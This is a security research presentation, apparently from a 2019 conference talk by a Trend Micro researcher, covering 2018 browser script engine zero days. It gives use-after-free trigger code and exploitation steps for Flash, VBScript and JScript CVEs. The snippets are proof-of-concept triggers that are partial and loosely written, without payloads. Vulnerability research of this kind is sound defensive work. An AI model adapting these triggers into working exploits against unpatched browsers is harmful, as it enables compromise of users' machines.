# Browser Script Engine: Zero Days in 2018
## Presenter: Elliot Cao
### Trend Micro
#### 2019-05-30

## About the Presenter
- **Previous Occupation**: Electrical Engineer
- **Joined Trend Micro**: 2017
- **Current Role**: Sandbox Developer
- **Research Focus**: Browser Script Engine Vulnerabilities
- **Social Media Handle**: Lei Cao (@elli0tn0phacker)

## Agenda
1. **Browser Zero Days in 2018**
2. **VBSEmulator**
3. **Chakra**

## Browser Zero Days in 2018
### Flash Zero Days
- **CVE-2018-4878**
  - **Exploit Code**:
    ```actionscript
    var psdk:PSDK = PSDK.pSDK;
    var psdk_dispatcher:PSDKEventDispatcher = psdk.createDispatcher();
    this.mediaPlayer = psdk.createMediaPlayer(psdk_dispatcher);
    this.my_DRMListerner = new DRMOperationCompleteListener();
    this.mediaPlayer.drmManager.initialize(this.my_DRMListerner);
    this.my_DRMListerner = null;
    
    try {
        new LocalConnection().connect("foo");
        new LocalConnection().connect("foo");
    } catch (e:Error) {
        my_DRMListerner_vuln = new DRMOperationCompleteListener();
    }
    ```
  - **Steps**:
    1. Create an object.
    2. Free the object.
    3. Reuse the freed memory.
    4. Trigger garbage collection to get a dangling pointer.

- **CVE-2018-15982**
  - **Exploit Code**:
    ```actionscript
    var ba:ByteArray = new ByteArray();
    var md:Metadata = new Metadata();
    var arr_key:* = null;
    i = 0;
    while (i < 0x100) {
        md.setObject(i.toString(), ba);
        i++;
    }
    
    try {
        new LocalConnection().connect("foo");
        new LocalConnection().connect("foo");
    } catch (e:Error) {}
    
    arr_key = md.keySet;
    ```
  - **Steps**:
    1. Create some String objects and save them to `Metadata`.
    2. Trigger garbage collection.
    3. Get dangling pointers from `arr_key`.

### VBScript Zero Days
- **CVE-2018-8174**
  - **Exploit Code**:
    ```vbscript
    Dim arr(1)
    Dim o
    Class MyClass
        Private Sub Class_Terminate
            Set o = arr(0)
            arr(0) = &h12345678
        End Sub
    End Class
    Set arr(0) = New MyClass
    Erase arr
    MsgBox o
    ```
  - **Steps**:
    1. Create one `MyClass` object and save its pointer to `arr(0)`.
    2. Save the `MyClass` object pointer to variable `o`.
    3. Get a dangling pointer.

- **CVE-2018-8373**
  - **Exploit Code**:
    ```vbscript
    Dim arr()
    ReDim arr(2)
    Class MyClass
        Public Default Property Get P
            ReDim arr(1)
        End Sub
    End Class
    arr(2) = New MyClass
    ```
  - **Steps**:
    1. Save the `arr(2)` address on the stack.
    2. The original array buffer will be freed by `ReDim`.
    3. Get a dangling pointer.

### JScript Zero Days
- **CVE-2018-8653**
  - **Exploit Code**:
    ```javascript
    for (var i = 0; i < limit; i++) {       
        var arr = new Array({prototype:{}});
        var e = new Enumerator(arr);
        e.moveFirst();
        refs[i] = e.item();
    }
    for (var i = 0; i < limit; i++) {
        refs[i].prototype = {};
        refs[i].prototype.isPrototypeOf = getFreeRef;
    }
    dummyObj instanceof refs[0];

    function getFreeRef() {            
        if (count == limit) {                      
            for (var i = 0; i < limit; i++) {
                refs[i].prototype = 0;
            }
            CollectGarbage();               
        } else {
            dummyObj instanceof refs[count++];
        }            
        // crash here
        this;           
        return false;
    }
    ```
  - **Steps**:
    1. Create an array containing an object with a prototype object.
    2. Set the prototype object's `isPrototypeOf` method to the `getFreeRef` callback.
    3. Trigger the `getFreeRef` callback.
    4. Break out and release the prototype object by garbage collection.
    5. Recursive calls to put `this` on the stack, leading to a crash.

This presentation provides an overview of significant browser script engine vulnerabilities discovered in 2018, along with detailed exploit code and steps to understand how these zero-day vulnerabilities were exploited.